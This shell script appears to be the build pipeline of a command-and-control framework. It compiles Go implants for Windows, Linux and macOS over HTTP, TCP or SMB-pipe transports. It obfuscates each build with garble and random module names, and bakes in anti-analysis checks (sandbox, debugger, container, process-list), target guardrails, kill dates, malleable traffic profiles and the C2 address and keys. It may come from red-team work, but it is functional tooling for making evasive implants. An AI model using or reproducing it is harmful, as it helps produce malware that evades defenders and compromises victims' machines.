#!/bin/sh
set -e  # Exit on error

# Check for project export mode FIRST
if [ "$EXPORT_PROJECT" = "TRUE" ]; then
    echo "=== Project Export Mode ==="
    echo "OS: ${OS}"
    echo "PAYLOAD_TYPE: ${PAYLOAD_TYPE:-http}"
    echo "PROJECT_ID: ${PROJECT_ID}"
    echo "OUTPUT_FILENAME: ${OUTPUT_FILENAME}"

    # Determine source directory based on OS and payload type
    payload_type=${PAYLOAD_TYPE:-http}
    case "${OS}" in
        "linux")
            if [ "$payload_type" = "tcp" ]; then
                source_dir="TCP_Linux"
            else
                source_dir="Linux"
            fi
            ;;
        "windows")
            if [ "$payload_type" = "smb" ]; then
                source_dir="SMB_Windows"
            elif [ "$payload_type" = "tcp" ]; then
                source_dir="TCP_Windows"
            else
                source_dir="Windows"
            fi
            ;;
        "darwin")
            if [ "$payload_type" = "tcp" ]; then
                source_dir="TCP_Darwin"
            else
                source_dir="Darwin"
            fi
            ;;
        *)
            echo "Error: Unknown OS ${OS}"
            exit 1
            ;;
    esac
    
    # Setup directory for export
    rm -rf /app/*
    mkdir -p /app
    
    # Copy ALL files from the OS-specific directory
    echo "Copying all ${source_dir} files..."
    cp -r /build/${source_dir}/* /app/ 2>/dev/null || true
    
    # Copy the init_variables.go file (renamed from constants.go)
    cp /shared/${PROJECT_ID}_init_variables.go /app/init_variables.go
    
    # Copy go.mod from preload
    cp /preload/go.mod /app/go.mod
    cp /preload/go.sum /app/go.sum
    
    # Copy build script
    cp /shared/${PROJECT_ID}_build.sh /app/build.sh
    chmod +x /app/build.sh
    
    # Copy Makefile
    if [ -f "/shared/${PROJECT_ID}_Makefile" ]; then
        cp /shared/${PROJECT_ID}_Makefile /app/Makefile
    fi
    
    # For Windows, also copy the batch file
    if [ "${OS}" = "windows" ] && [ -f "/shared/${PROJECT_ID}_build.bat" ]; then
        cp /shared/${PROJECT_ID}_build.bat /app/build.bat
    fi
    
    # Clean up temporary files
    rm -f /shared/${PROJECT_ID}_*
    
    # Zip everything up
    cd /
    zip -r "/shared/${OUTPUT_FILENAME}" app/
    # Make file deletable by other containers (websocket runs as non-root user)
    chmod 666 "/shared/${OUTPUT_FILENAME}"
    chown 1001:1001 "/shared/${OUTPUT_FILENAME}"

    echo "Project exported to /shared/${OUTPUT_FILENAME}"
    rm -f /shared/${PROJECT_ID}_*

    exit 0
fi

# Function to generate a random module name
generate_random_module_name() {
    head /dev/urandom | tr -dc A-Za-z0-9 | head -c 15
}

# Function to setup the build directory
setup_build_dir() {
    local build_os=$1
    local payload_type=${PAYLOAD_TYPE:-http}
    local source_dir

    case "${build_os}" in
        "linux")
            # Check if this is a TCP payload
            if [ "$payload_type" = "tcp" ]; then
                source_dir="TCP_Linux"
            else
                source_dir="Linux"
            fi
            ;;
        "windows" | "win")
            # Check if this is an SMB or TCP payload
            if [ "$payload_type" = "smb" ]; then
                source_dir="SMB_Windows"
            elif [ "$payload_type" = "tcp" ]; then
                source_dir="TCP_Windows"
            else
                source_dir="Windows"
            fi
            ;;
        "darwin")
            # Check if this is a TCP payload
            if [ "$payload_type" = "tcp" ]; then
                source_dir="TCP_Darwin"
            else
                source_dir="Darwin"
            fi
            ;;
        *)
            echo "Error: Unknown OS ${build_os}"
            exit 1
            ;;
    esac

    echo "=== Setting up build directory for ${build_os} (payload_type: ${payload_type}) ==="
    rm -rf /app/*
    mkdir -p /app

    # Copy everything from the OS-specific directory
    echo "Copying all files from /build/${source_dir}/..."
    cp -r /build/${source_dir}/* /app/ 2>/dev/null || true

    # List what was copied for debugging
    echo "Files copied to /app:"
    ls -la /app/

    echo "Build directory setup complete."
}

# Initialize go.mod with random module name
initialize_go_mod() {
    local module_name=$1
    echo "Initializing go.mod with random module name: ${module_name}"
    cd /app

    # Initialize new module with random name
    go mod init "${module_name}"
    
    # Copy the exact dependencies from preload
    echo "require (" >> go.mod
    awk '/require \(/,/\)/' /preload/go.mod | grep -v "require (" | grep -v ")" >> go.mod
    echo ")" >> go.mod
    
    # Copy the go.sum exactly as is
    cp /preload/go.sum ./go.sum

    echo "Module initialization complete."
}

# Function to replace imports
replace_imports() {
    local new_module_name=$1

    echo "Updating imports to use random module name: ${new_module_name}"
    
    # Update any internal package imports if they exist
    find /app -type f -name '*.go' -exec sed -i "s|\"client/|\"${new_module_name}/|g" '{}' ';'
    
    # If you have other import patterns, add them here
    find /app -type f -name '*.go' -exec sed -i "s|\"payload/|\"${new_module_name}/|g" '{}' ';'
    
    echo "Import replacement complete."
}

# Build binary function
build_binary() {
    local os=$1
    local arch=$2
    local module_name=$3

    echo "Building binary for ${os}/${arch}..."
    
    # Display HTTP method configuration
    echo "=== HTTP Method Configuration ==="
    echo "GET method: ${GET_METHOD:-GET}"
    echo "POST method: ${POST_METHOD:-POST}"
    echo "================================="
    
    # Build toggle flags
    TOGGLE_FLAGS=""
    [ ! -z "${TOGGLE_CHECK_ENVIRONMENT}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckEnvironment=${TOGGLE_CHECK_ENVIRONMENT}'"
    [ ! -z "${TOGGLE_CHECK_TIME_DISCREPANCY}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckTimeDiscrepancy=${TOGGLE_CHECK_TIME_DISCREPANCY}'"
    [ ! -z "${TOGGLE_CHECK_MEMORY_PATTERNS}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckMemoryPatterns=${TOGGLE_CHECK_MEMORY_PATTERNS}'"
    [ ! -z "${TOGGLE_CHECK_PARENT_PROCESS}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckParentProcess=${TOGGLE_CHECK_PARENT_PROCESS}'"
    [ ! -z "${TOGGLE_CHECK_LOADED_LIBRARIES}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckLoadedLibraries=${TOGGLE_CHECK_LOADED_LIBRARIES}'"
    [ ! -z "${TOGGLE_CHECK_DOCKER_CONTAINER}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckDockerContainer=${TOGGLE_CHECK_DOCKER_CONTAINER}'"
    [ ! -z "${TOGGLE_CHECK_PROCESS_LIST}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckProcessList=${TOGGLE_CHECK_PROCESS_LIST}'"

    # Build safety check flags
    SAFETY_FLAGS=""
    [ ! -z "${SAFETY_HOSTNAME}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyHostname=${SAFETY_HOSTNAME}'"
    [ ! -z "${SAFETY_USERNAME}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyUsername=${SAFETY_USERNAME}'"
    [ ! -z "${SAFETY_DOMAIN}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyDomain=${SAFETY_DOMAIN}'"
    [ ! -z "${SAFETY_FILE_PATH}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyFilePath=${SAFETY_FILE_PATH}'"
    [ ! -z "${SAFETY_FILE_MUST_EXIST}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyFileMustExist=${SAFETY_FILE_MUST_EXIST}'"
    [ ! -z "${SAFETY_PROCESS}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyProcess=${SAFETY_PROCESS}'"
    [ ! -z "${SAFETY_KILL_DATE}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyKillDate=${SAFETY_KILL_DATE}'"
    [ ! -z "${SAFETY_WORK_HOURS_START}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyWorkHoursStart=${SAFETY_WORK_HOURS_START}'"
    [ ! -z "${SAFETY_WORK_HOURS_END}" ] && SAFETY_FLAGS="${SAFETY_FLAGS} -X 'main.safetyWorkHoursEnd=${SAFETY_WORK_HOURS_END}'"

    # Debug output (optional - remove in production)
    echo "[*] Building payload with safety checks:"
    [ ! -z "${SAFETY_HOSTNAME}" ] && echo "  - Hostname: ${SAFETY_HOSTNAME}"
    [ ! -z "${SAFETY_USERNAME}" ] && echo "  - Username: ${SAFETY_USERNAME}"
    [ ! -z "${SAFETY_DOMAIN}" ] && echo "  - Domain: ${SAFETY_DOMAIN}"
    [ ! -z "${SAFETY_FILE_PATH}" ] && echo "  - File: ${SAFETY_FILE_PATH} (must_exist: ${SAFETY_FILE_MUST_EXIST})"
    [ ! -z "${SAFETY_PROCESS}" ] && echo "  - Process: ${SAFETY_PROCESS}"
    [ ! -z "${SAFETY_KILL_DATE}" ] && echo "  - Kill Date: ${SAFETY_KILL_DATE}"
    [ ! -z "${SAFETY_WORK_HOURS_START}" ] && echo "  - Working Hours: ${SAFETY_WORK_HOURS_START} - ${SAFETY_WORK_HOURS_END}"

    # Build SMB-specific flags if this is an SMB payload
    SMB_FLAGS=""
    if [ "${PAYLOAD_TYPE}" = "smb" ]; then
        if [ -z "${PIPE_NAME}" ]; then
            echo "[ERROR] PIPE_NAME environment variable required for SMB payloads"
            exit 1
        fi
        echo "[*] Building SMB payload with pipe: ${PIPE_NAME}"
        SMB_FLAGS="-X 'main.pipeName=${PIPE_NAME}'"
        # Add SMB transform profile if configured
        if [ ! -z "${SMB_DATA_TRANSFORMS}" ]; then
            echo "[*] SMB data transforms configured"
            SMB_FLAGS="${SMB_FLAGS} -X 'main.smbDataTransforms=${SMB_DATA_TRANSFORMS}'"
        fi
    fi

    # Build TCP-specific flags if this is a TCP payload
    TCP_FLAGS=""
    if [ "${PAYLOAD_TYPE}" = "tcp" ]; then
        echo "[*] Building TCP payload on port: ${TCP_PORT:-4444}"
        TCP_FLAGS="-X 'main.tcpPort=${TCP_PORT:-4444}'"
        # Add encrypted config (contains TCP Port, Secret, Public Key)
        if [ ! -z "${ENCRYPTED_CONFIG}" ]; then
            TCP_FLAGS="${TCP_FLAGS} -X 'main.encryptedConfig=${ENCRYPTED_CONFIG}'"
        fi
        # Add TCP transform profile if configured
        if [ ! -z "${TCP_DATA_TRANSFORMS}" ]; then
            echo "[*] TCP data transforms configured"
            TCP_FLAGS="${TCP_FLAGS} -X 'main.tcpDataTransforms=${TCP_DATA_TRANSFORMS}'"
        fi
    fi

    # Run garble build with all flags including safety checks
    cd /app

    # Use different ldflags for SMB, TCP, and HTTP payloads
    if [ "${PAYLOAD_TYPE}" = "smb" ]; then
        # SMB payload - uses xorKey for runtime decryption (same security as HTTPS)
        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
            -ldflags "-w -s -buildid= \
            -X 'main.xorKey=${XOR_KEY}' \
            -X 'main.clientID=${CLIENTID}' \
            -X 'main.sleep=${SLEEP}' \
            -X 'main.jitter=${JITTER}' \
            -X 'main.secret=${SECRET}' \
            -X 'main.encryptedConfig=${ENCRYPTED_CONFIG}' \
            -X 'main.MALLEABLE_LINK_DATA_FIELD=${MALLEABLE_LINK_DATA_FIELD}' \
            -X 'main.MALLEABLE_LINK_COMMANDS_FIELD=${MALLEABLE_LINK_COMMANDS_FIELD}' \
            -X 'main.MALLEABLE_LINK_HANDSHAKE_FIELD=${MALLEABLE_LINK_HANDSHAKE_FIELD}' \
            -X 'main.MALLEABLE_LINK_HANDSHAKE_RESP_FIELD=${MALLEABLE_LINK_HANDSHAKE_RESP_FIELD}' \
            -X 'main.MALLEABLE_LINK_UNLINK_FIELD=${MALLEABLE_LINK_UNLINK_FIELD}' \
            -X 'main.MALLEABLE_ROUTING_ID_FIELD=${MALLEABLE_ROUTING_ID_FIELD}' \
            -X 'main.MALLEABLE_PAYLOAD_FIELD=${MALLEABLE_PAYLOAD_FIELD}' \
            ${SMB_FLAGS} \
            ${SAFETY_FLAGS}" \
            -trimpath -o "/output/${OUTPUT_FILENAME}"
    elif [ "${PAYLOAD_TYPE}" = "tcp" ]; then
        # TCP payload - uses xorKey for runtime decryption, similar to SMB
        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
            -ldflags "-w -s -buildid= \
            -X 'main.xorKey=${XOR_KEY}' \
            -X 'main.clientID=${CLIENTID}' \
            -X 'main.sleep=${SLEEP}' \
            -X 'main.jitter=${JITTER}' \
            -X 'main.secret=${SECRET}' \
            -X 'main.MALLEABLE_LINK_DATA_FIELD=${MALLEABLE_LINK_DATA_FIELD}' \
            -X 'main.MALLEABLE_LINK_COMMANDS_FIELD=${MALLEABLE_LINK_COMMANDS_FIELD}' \
            -X 'main.MALLEABLE_LINK_HANDSHAKE_FIELD=${MALLEABLE_LINK_HANDSHAKE_FIELD}' \
            -X 'main.MALLEABLE_LINK_HANDSHAKE_RESP_FIELD=${MALLEABLE_LINK_HANDSHAKE_RESP_FIELD}' \
            -X 'main.MALLEABLE_LINK_UNLINK_FIELD=${MALLEABLE_LINK_UNLINK_FIELD}' \
            -X 'main.MALLEABLE_ROUTING_ID_FIELD=${MALLEABLE_ROUTING_ID_FIELD}' \
            -X 'main.MALLEABLE_PAYLOAD_FIELD=${MALLEABLE_PAYLOAD_FIELD}' \
            ${TCP_FLAGS} \
            ${SAFETY_FLAGS}" \
            -trimpath -o "/output/${OUTPUT_FILENAME}"
    else
        # HTTP payload - full ldflags
        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
            -ldflags "-w -s -buildid= \
            -X 'main.xorKey=${XOR_KEY}' \
            -X 'main.clientID=${CLIENTID}' \
            -X 'main.sleep=${SLEEP}' \
            -X 'main.jitter=${JITTER}' \
            -X 'main.userAgent=${USER_AGENT}' \
            -X 'main.contentType=${CONTENT_TYPE}' \
            -X 'main.customHeaders=${CUSTOM_HEADERS}' \
            -X 'main.getRoute=${GET_ROUTE}' \
            -X 'main.postRoute=${POST_ROUTE}' \
            -X 'main.getMethod=${GET_METHOD}' \
            -X 'main.postMethod=${POST_METHOD}' \
            -X 'main.getClientIDName=${GET_CLIENT_ID_NAME}' \
            -X 'main.getClientIDFormat=${GET_CLIENT_ID_FORMAT}' \
            -X 'main.postClientIDName=${POST_CLIENT_ID_NAME}' \
            -X 'main.postClientIDFormat=${POST_CLIENT_ID_FORMAT}' \
            -X 'main.postSecretName=${POST_SECRET_NAME}' \
            -X 'main.postSecretFormat=${POST_SECRET_FORMAT}' \
            -X 'main.publicKey=${PUBLIC_KEY}' \
            -X 'main.secret=${SECRET}' \
            -X 'main.protocol=${PROTOCOL}' \
            -X 'main.ip=${IP}' \
            -X 'main.port=${PORT}' \
            -X 'main.MALLEABLE_REKEY_COMMAND=${MALLEABLE_REKEY_COMMAND}' \
            -X 'main.MALLEABLE_REKEY_STATUS_FIELD=${MALLEABLE_REKEY_STATUS_FIELD}' \
            -X 'main.MALLEABLE_REKEY_DATA_FIELD=${MALLEABLE_REKEY_DATA_FIELD}' \
            -X 'main.MALLEABLE_REKEY_ID_FIELD=${MALLEABLE_REKEY_ID_FIELD}' \
            -X 'main.MALLEABLE_LINK_DATA_FIELD=${MALLEABLE_LINK_DATA_FIELD}' \
            -X 'main.MALLEABLE_LINK_COMMANDS_FIELD=${MALLEABLE_LINK_COMMANDS_FIELD}' \
            -X 'main.MALLEABLE_LINK_HANDSHAKE_FIELD=${MALLEABLE_LINK_HANDSHAKE_FIELD}' \
            -X 'main.MALLEABLE_LINK_HANDSHAKE_RESP_FIELD=${MALLEABLE_LINK_HANDSHAKE_RESP_FIELD}' \
            -X 'main.MALLEABLE_LINK_UNLINK_FIELD=${MALLEABLE_LINK_UNLINK_FIELD}' \
            -X 'main.MALLEABLE_ROUTING_ID_FIELD=${MALLEABLE_ROUTING_ID_FIELD}' \
            -X 'main.MALLEABLE_PAYLOAD_FIELD=${MALLEABLE_PAYLOAD_FIELD}' \
            -X 'main.getClientIDTransforms=${GET_CLIENTID_TRANSFORMS}' \
            -X 'main.postClientIDTransforms=${POST_CLIENTID_TRANSFORMS}' \
            -X 'main.postDataTransforms=${POST_DATA_TRANSFORMS}' \
            -X 'main.responseDataTransforms=${RESPONSE_DATA_TRANSFORMS}' \
            ${TOGGLE_FLAGS} \
            ${SAFETY_FLAGS}" \
            -trimpath -o "/output/${OUTPUT_FILENAME}"
    fi

    if [ ! -f "/output/${OUTPUT_FILENAME}" ]; then
        echo "Error: Binary build failed for ${os}/${arch}"
        exit 1
    fi

    echo "Binary successfully built: /output/${OUTPUT_FILENAME}"
}

# Build handlers for each OS
build_linux() {
    echo "=== Building Linux binary ==="
    setup_build_dir "linux"
    local module_name=$(generate_random_module_name)
    initialize_go_mod "${module_name}"
    replace_imports "${module_name}"
    build_binary "linux" "${ARCH}" "${module_name}"
}

build_windows() {
    echo "=== Building Windows binary ==="
    setup_build_dir "windows"
    local module_name=$(generate_random_module_name)
    initialize_go_mod "${module_name}"
    replace_imports "${module_name}"
    build_binary "windows" "${ARCH}" "${module_name}"
}

build_darwin() {
    echo "=== Building Darwin binary ==="
    setup_build_dir "darwin"
    local module_name=$(generate_random_module_name)
    initialize_go_mod "${module_name}"
    replace_imports "${module_name}"
    build_binary "darwin" "${ARCH}" "${module_name}"
}

# Main execution
if [ "$BUILD" == "FALSE" ]; then
    echo "Build is set to FALSE, exiting."
    exit 1
fi

echo "=== Starting Build Process ==="
echo "Target OS: ${OS}"
echo "Target Architecture: ${ARCH}"
echo "Output Filename: ${OUTPUT_FILENAME}"
echo "=============================="

# Route to appropriate build function
case "${OS}" in
    "windows")
        build_windows
        ;;
    "linux")
        build_linux
        ;;
    "darwin")
        build_darwin
        ;;
    *)
        echo "Error: Unsupported OS specified: ${OS}"
        exit 1
        ;;
esac

# Copy build output to shared volume
if [ -f "/output/${OUTPUT_FILENAME}" ]; then
    echo "=== Build Complete ==="
    echo "Copying to shared volume..."
    cp "/output/${OUTPUT_FILENAME}" "/shared/${OUTPUT_FILENAME}"
    # Make file deletable by other containers (websocket runs as non-root user)
    chmod 666 "/shared/${OUTPUT_FILENAME}"
    chown 1001:1001 "/shared/${OUTPUT_FILENAME}"
    echo "Binary available at: /shared/${OUTPUT_FILENAME}"
    exit 0
else
    echo "Error: Build output file not found"
    exit 1
fi